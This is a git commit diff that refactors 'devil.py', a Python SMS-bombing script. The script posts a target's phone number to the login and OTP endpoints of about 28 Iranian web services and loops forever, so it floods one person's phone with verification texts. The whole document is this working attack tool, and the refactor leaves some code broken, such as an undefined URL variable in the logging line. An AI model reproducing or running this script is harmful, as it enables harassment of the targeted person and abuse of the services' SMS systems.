0301c3e08cffff609a673e9cd0c379b30dcc4e18
amirdeviiil <160165254+amirdeviiil@users.noreply.github.com>
2024-03-19 00:50:45 +0330

    Update devil.py

--- devil.py
+++ devil.py
@@ -3,17 +3,13 @@ import json
 import random
 import string
 import time
+import re
 
-def CURL_SMS(URL, PHONE_VALUE, HEADER1=None, HEADER2=None):
+def curl_sms(url, data, headers=None):
     response = None
-    headers = {}
-    if HEADER1:
-        if HEADER2:
-            headers = {HEADER1: HEADER2}
-        else:
-            headers = {HEADER1}
+    headers = headers or {}
     try:
-        response = requests.post(URL, data=PHONE_VALUE, headers=headers)
+        response = requests.post(url, data=data, headers=headers)
         response.raise_for_status()
         with open('log.txt', 'a') as log_file:
             log_file.write(f'[{time.strftime("%Y-%m-%d %H:%M:%S")}]--URL={URL}{response.text}\n\n')
@@ -24,13 +20,13 @@ def CURL_SMS(URL, PHONE_VALUE, HEADER1=None, HEADER2=None):
 def divar(phone):
     url = 'https://api.divar.ir/v5/auth/authenticate'
     phone_value = json.dumps({"phone": phone})
-    CURL_SMS(url, phone_value)
+    curl_sms(url, phone_value)
 
 def nobatir(phone):
     url = 'https://nobat.ir/api/public/patient/login/phone'
     phone_value = {"mobile": phone}
     headers = {'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def alopeyk_login(phone):
     phone = int(phone)
@@ -48,56 +44,56 @@ def alopeyk_login(phone):
         "phone": phone
     }
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, json.dumps(phone_value), headers)
+    curl_sms(url, json.dumps(phone_value), headers)
 
 def shahrefarsh(phone):
     url = 'https://shahrfarsh.com/Account/Login'
     phone_value = 'phoneNumber=' + phone
-    CURL_SMS(url, phone_value)
+    curl_sms(url, phone_value)
 
 def digistyle(phone):
     global response
     url = 'https://www.digistyle.com/users/login-register/'
     phone_value = 'loginRegister%5Bemail_phone%5D=' + phone
-    CURL_SMS(url, phone_value)
+    curl_sms(url, phone_value)
     token = re.search(r'(?<=token=)(.*)(?=&amp)', response)
     if token:
         token_value = token.group(0)
         confirmation_url = f'https://www.digistyle.com/users/register/confirm/?token={token_value}&type=register'
         requests.get(confirmation_url)
 
-def snapp_express(phone):
+def snapp_express(phone, headers=None):
     url = 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b'
     phone_value = f'cellphone={phone}&captcha=&optionalLoginToken=true&local='
-    CURL_SMS(url, phone_value)
+    curl_sms(url, phone_value, headers)
 
 def azki(phone):
     url = 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/'
     phone_value = json.dumps({"phoneNumber": phone})
     headers = {'content-type': 'application/json', 'deviceid': '6'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def digikala_jet(phone):
     url = 'https://api.digikalajet.ir/user/login-register/'
     phone_value = json.dumps({"phone": phone})
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def snapp_drivers(phone):
     url = 'https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=' + phone
     phone_value = json.dumps({"cellphone": phone})
-    CURL_SMS(url, phone_value)
+    curl_sms(url, phone_value)
 
 def ostadkar(phone):
     url = 'https://api.ostadkr.com/login'
     phone_value = json.dumps({"mobile": phone})
-    CURL_SMS(url, phone_value)
+    curl_sms(url, phone_value)
 
 def miare(phone):
     url = 'https://www.miare.ir/api/otp/driver/request/'
     phone_value = json.dumps({"phone_number": phone})
     headers = {'Content-Type': 'application/json;charset=UTF-8'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def tapsi_drivers(phone):
     url = 'https://api.tapsi.ir/api/v2.2/user'
@@ -109,7 +105,7 @@ def tapsi_drivers(phone):
         "otpOption": "SMS"
     })
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def tapsi_passenger(phone):
     url = 'https://api.tapsi.ir/api/v2.2/user'
@@ -121,13 +117,13 @@ def tapsi_passenger(phone):
         "otpOption": "SMS"
     })
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def banimode(phone):
     url = 'https://mobapi.banimode.com/api/v2/auth/request'
     phone_value = json.dumps({"phone": phone})
     headers = {'Content-Type': 'application/json;charset=UTF-8'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def drdr(phone):
     url = 'https://drdr.ir/api/v3/auth/login/mobile/init'
@@ -136,25 +132,25 @@ def drdr(phone):
         'content-type': 'application/json',
         'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054'
     }
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def taaghche_login(phone):
     url = 'https://gw.taaghche.com/v4/site/auth/login'
     phone_value = json.dumps({"contact": phone, "forceOtp": False})
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def taaghche_signup(phone):
     url = 'https://gw.taaghche.com/v4/site/auth/signup'
     phone_value = json.dumps({"contact": phone})
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def komodaa(phone):
     url = 'https://api.komodaa.com/api/v2.6/loginRC/request'
     phone_value = json.dumps({"phone_number": phone})
     headers = {'Content-Type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def ghabzino(phone):
     url = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
@@ -168,102 +164,101 @@ def ghabzino(phone):
         }
     })
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def barghe_man(phone):
     url = 'https://uiapi2.saapa.ir/api/otp/sendCode'
     phone_value = json.dumps({"mobile": phone, "from_meter_buy": False})
-    CURL_SMS(url, phone_value)
+    curl_sms(url, phone_value)
 
 def vandar(phone):
     url = 'https://api.vandar.io/account/v1/check/mobile'
     phone_value = json.dumps({"mobile": phone})
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def mobit(phone):
     url = 'https://api.mobit.ir/api/web/v8/register/register'
     phone_value = json.dumps({"number": phone})
     headers = {'content-type': 'application/json;charset=UTF-8'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def jabama(phone):
     url = 'https://taraazws.jabama.com/api/v4/account/send-code'
     phone_value = json.dumps({"mobile": phone})
     headers = {'Content-Type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def pinorest(phone):
     url = 'https://api.pinorest.com/frontend/auth/login/mobile'
     phone_value = json.dumps({"mobile": phone})
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def tetherland(phone):
     url = 'https://service.tetherland.com/api/v5/login-register'
     phone_value = json.dumps({"mobile": phone})
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
-def alibaba(phone):
+def alibaba(phone_number):
     url = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
-    phone_value = json.dumps({"phoneNumber": phone})
+    phone_value = json.dumps({"phoneNumber": phone_number})
     headers = {'Content-Type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def drnext(phone):
     url = 'https://cyclops.drnext.ir/v1/patients/auth/send-verification-token'
-    phone_values = json.dumps({"source": "besina", "mobile": phone})
+    phone_value = json.dumps({"source": "besina", "mobile": phone})
     headers = {'content-type': 'application/json'}
-    CURL_SMS(url, phone_values, headers)
+    curl_sms(url, phone_value, headers)
 
 def classino(phone):
     url = 'https://student.classino.com/otp/v1/api/login'
     phone_value = json.dumps({"mobile": phone})
     headers = {'Content-Type': 'application/json'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def takshopaccessorise(phone):
     url = 'https://takshopaccessorise.ir/api/v1/sessions/login_request'
     phone_value = json.dumps({"mobile_phone": phone})
     headers = {'content-type': 'application/json;charset=UTF-8'}
-    CURL_SMS(url, phone_value, headers)
+    curl_sms(url, phone_value, headers)
 
 def generate_random_string(length=10):
     characters = string.ascii_letters + string.digits
     return ''.join(random.choice(characters) for _ in range(length))
 
-def main(phone):
+def main(phone_number):
     while True:
-        divar(phone)
-        nobatir(phone)
-        alopeyk_login(phone)
-        shahrefarsh(phone)
-        digistyle(phone)
-        digistyle(phone)
-        snapp_express(phone)
-        azki(phone)
-        digikala_jet(phone)
-        snapp_drivers(phone)
-        ostadkar(phone)
-        miare(phone)
-        tapsi_drivers(phone)
-        banimode(phone)
-        drdr(phone)
-        taaghche_login(phone)
-        taaghche_signup(phone)
-        komodaa(phone)
-        ghabzino(phone)
-        barghe_man(phone)
-        vandar(phone)
-        mobit(phone)
-        jabama(phone)
-        pinorest(phone)
-        tetherland(phone)
-        alibaba(phone)
-        drnext(phone)
-        classino(phone)
-        takshopaccessorise(phone)
+        divar(phone_number)
+        nobatir(phone_number)
+        alopeyk_login(phone_number)
+        shahrefarsh(phone_number)
+        digistyle(phone_number)
+        snapp_express(phone_number)
+        azki(phone_number)
+        digikala_jet(phone_number)
+        snapp_drivers(phone_number)
+        ostadkar(phone_number)
+        miare(phone_number)
+        tapsi_drivers(phone_number)
+        banimode(phone_number)
+        drdr(phone_number)
+        taaghche_login(phone_number)
+        taaghche_signup(phone_number)
+        komodaa(phone_number)
+        ghabzino(phone_number)
+        barghe_man(phone_number)
+        vandar(phone_number)
+        mobit(phone_number)
+        jabama(phone_number)
+        pinorest(phone_number)
+        tetherland(phone_number)
+        alibaba(phone_number)
+        drnext(phone_number)
+        classino(phone_number)
+        takshopaccessorise(phone_number)
 
         # Call other functions here for other services
         
